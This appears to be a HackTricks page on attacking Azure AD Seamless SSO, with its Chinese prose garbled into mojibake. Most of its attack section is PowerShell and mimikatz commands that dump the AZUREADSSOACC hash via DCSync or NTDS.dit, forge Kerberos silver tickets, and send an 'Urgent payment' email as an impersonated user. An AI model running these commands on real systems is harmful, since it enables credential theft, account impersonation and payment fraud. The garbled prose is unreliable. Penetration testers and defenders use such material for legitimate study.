# æ— ç¼å•ç‚¹ç™»å½•

<details>

<summary><strong>æ”¯æŒ HackTricks å¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—® PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDFï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS å’Œ HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

Azure Active Directory æ— ç¼å•ç‚¹ç™»å½•ï¼ˆAzure AD Seamless SSOï¼‰åœ¨ç”¨æˆ·è¿æ¥åˆ°å…¬å¸ç½‘ç»œçš„å…¬å¸è®¾å¤‡ä¸Šè‡ªåŠ¨**ç™»å½•ç”¨æˆ·**ã€‚å¯ç”¨åï¼Œç”¨æˆ·æ— éœ€è¾“å…¥å¯†ç å³å¯ç™»å½• Azure ADï¼Œé€šå¸¸ç”šè‡³æ— éœ€è¾“å…¥ç”¨æˆ·åã€‚æ­¤åŠŸèƒ½ä½¿ç”¨æˆ·èƒ½å¤Ÿè½»æ¾è®¿é—®åŸºäºäº‘çš„åº”ç”¨ç¨‹åºï¼Œæ— éœ€ä»»ä½•é¢å¤–çš„æœ¬åœ°ç»„ä»¶ã€‚

<figure><img src="../../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

åŸºæœ¬ä¸Šï¼ŒAzure AD æ— ç¼å•ç‚¹ç™»å½•åœ¨ç”¨æˆ·**ä½¿ç”¨æœ¬åœ°åŸŸåŠ å…¥çš„ PC**ä¸Šç™»å½•ã€‚

å®ƒæ”¯æŒ[**PHSï¼ˆå¯†ç å“ˆå¸ŒåŒæ­¥ï¼‰**](phs-password-hash-sync.md)å’Œ[**PTAï¼ˆé€æ˜éªŒè¯ï¼‰**](pta-pass-through-authentication.md)ã€‚

æ¡Œé¢ SSO ä½¿ç”¨**Kerberos**è¿›è¡Œèº«ä»½éªŒè¯ã€‚é…ç½®åï¼ŒAzure AD Connect åœ¨æœ¬åœ° AD ä¸­åˆ›å»ºä¸€ä¸ªåä¸º AZUREADSSOACC çš„è®¡ç®—æœºå¸æˆ·ã€‚åœ¨é…ç½®è¿‡ç¨‹ä¸­ï¼ŒAZUREADSSOACC å¸æˆ·çš„å¯†ç ä»¥æ˜æ–‡å½¢å¼å‘é€åˆ° Azure ADã€‚

**Kerberos ç¥¨æ®**ä½¿ç”¨å¯†ç çš„**NTHashï¼ˆMD4ï¼‰**è¿›è¡ŒåŠ å¯†ï¼ŒAzure AD ä½¿ç”¨å‘é€çš„å¯†ç è§£å¯†ç¥¨æ®ã€‚

**Azure AD**å…¬å¼€äº†ä¸€ä¸ª**ç»ˆç«¯ç‚¹**ï¼ˆhttps://autologon.microsoftazuread-sso.comï¼‰ï¼Œç”¨äºæ¥æ”¶ Kerberos ç¥¨æ®ã€‚åŸŸåŠ å…¥çš„è®¡ç®—æœºçš„æµè§ˆå™¨å°†ç¥¨æ®è½¬å‘åˆ°æ­¤ç»ˆç«¯ç‚¹ä»¥è¿›è¡Œå•ç‚¹ç™»å½•ã€‚

### æœ¬åœ° -> äº‘

ç”¨æˆ·**AZUREADSSOACC çš„å¯†ç æ°¸è¿œä¸ä¼šæ›´æ”¹**ã€‚å› æ­¤ï¼ŒåŸŸç®¡ç†å‘˜å¯ä»¥è·å–æ­¤å¸æˆ·çš„å“ˆå¸Œï¼Œå¹¶ä½¿ç”¨å®ƒæ¥åˆ›å»ºé“¶ç¥¨æ®ä»¥ä¸**ä»»ä½•åŒæ­¥çš„æœ¬åœ°ç”¨æˆ·**è¿æ¥åˆ° Azureï¼š
```powershell
# Dump hash using mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\azureadssoacc$ /domain:domain.local /dc:dc.domain.local"'
mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit

# Dump hash using https://github.com/MichaelGrafnetter/DSInternals
Get-ADReplAccount -SamAccountName 'AZUREADSSOACC$' -Domain contoso -Server lon-dc1.contoso.local

# Dump using ntdsutil and DSInternals
## Dump NTDS.dit
ntdsutil "ac i ntds" "ifmâ€ "create full C:\temp" q q
## Extract password
Install-Module DSInternals
Import-Module DSInternals
$key = Get-BootKey -SystemHivePath 'C:\temp\registry\SYSTEM'
(Get-ADDBAccount -SamAccountName 'AZUREADSSOACC$' -DBPath 'C:\temp\Active Directory\ntds.dit' -BootKey $key).NTHash | Format-Hexos
```
ç°åœ¨ï¼Œä½ å¯ä»¥ä½¿ç”¨å“ˆå¸Œå€¼æ¥**ç”Ÿæˆé“¶ç¥¨æ®**ï¼š
```powershell
# Get users and SIDs
Get-AzureADUser | Select UserPrincipalName,OnPremisesSecurityIdentifier

# Create a silver ticket to connect to Azure with mimikatz
Invoke-Mimikatz -Command '"kerberos::golden /user:onpremadmin /sid:S-1-5-21-123456789-1234567890-123456789 /id:1105 /domain:domain.local /rc4:<azureadssoacc hash> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"'
mimikatz.exe "kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit

# Create silver ticket with AADInternal to access Exchange Online
$kerberos=New-AADIntKerberosTicket -SidString "S-1-5-21-854168551-3279074086-2022502410-1104" -Hash "97B745CBED7B9DD6FE6C992024BC38F4"
$at=Get-AADIntAccessTokenForEXO -KerberosTicket $kerberos -Domain company.com
## Send email
Send-AADIntOutlookMessage -AccessToken $at -Recipient "someone@company.com" -Subject "Urgent payment" -Message "<h1>Urgent!</h1><br>The following bill should be paid asap."
```
è¦ä½¿ç”¨é“¶ç¥¨ï¼š

1. å¯åŠ¨_Mozilla Firefox_ã€‚
2. è½¬åˆ°**`about:config`**å¹¶å°†[network.negotiate-auth.trusted-uris](https://github.com/mozilla/policy-templates/blob/master/README.md#authentication)é¦–é€‰é¡¹è®¾ç½®ä¸º[value](https://docs.microsoft.com/en-us/azure/active-directory/connect/active-directory-aadconnect-sso#ensuring-clients-sign-in-automatically)`https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com`ã€‚
3. å¯¼èˆªåˆ°ä¸æˆ‘ä»¬çš„AADåŸŸé›†æˆçš„ä»»ä½•Webåº”ç”¨ç¨‹åºã€‚æˆ‘ä»¬å°†ä½¿ç”¨[Office 365](https://portal.office.com/)ï¼Œè¿™æ˜¯æœ€å¸¸ç”¨çš„åº”ç”¨ç¨‹åºä¹‹ä¸€ã€‚
4. ä¸€æ—¦åˆ°è¾¾ç™»å½•ç•Œé¢ï¼Œè¯·å¡«å†™ç”¨æˆ·åï¼ŒåŒæ—¶å°†å¯†ç å­—æ®µç•™ç©ºã€‚ç„¶åæŒ‰TABæˆ–ENTERé”®ã€‚

<figure><img src="../../../../.gitbook/assets/image (3) (3) (1).png" alt=""><figcaption></figcaption></figure>

#### å°±æ˜¯è¿™æ ·ï¼ä½ åº”è¯¥ç™»å½•æˆåŠŸäº†ï¼ <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>

#### ~~ä¸ºä»…äº‘ç”¨æˆ·åˆ›å»ºKerberosç¥¨æ®~~ <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>

å¦‚æœActive Directoryç®¡ç†å‘˜å¯ä»¥è®¿é—®Azure AD Connectï¼Œä»–ä»¬å¯ä»¥ä¸ºä»»ä½•äº‘ç”¨æˆ·**è®¾ç½®SID**ã€‚è¿™æ ·ï¼ŒKerberos **ç¥¨æ®**ä¹Ÿå¯ä»¥ä¸ºä»…äº‘ç”¨æˆ·**åˆ›å»º**ã€‚å”¯ä¸€çš„è¦æ±‚æ˜¯SIDæ˜¯ä¸€ä¸ªæ­£ç¡®çš„[SID](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc778824\(v=ws.10\))ã€‚

{% hint style="danger" %}
å¾®è½¯ç°åœ¨**é˜»æ­¢æ›´æ”¹äº‘ç®¡ç†å‘˜ç”¨æˆ·çš„SID**ã€‚\
æœ‰å…³ä¿¡æ¯ï¼Œè¯·è®¿é—®[https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
{% endhint %}

## å‚è€ƒèµ„æ–™

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso)
* [https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/](https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨å¸Œæœ›åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**ï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘**[**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ**[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
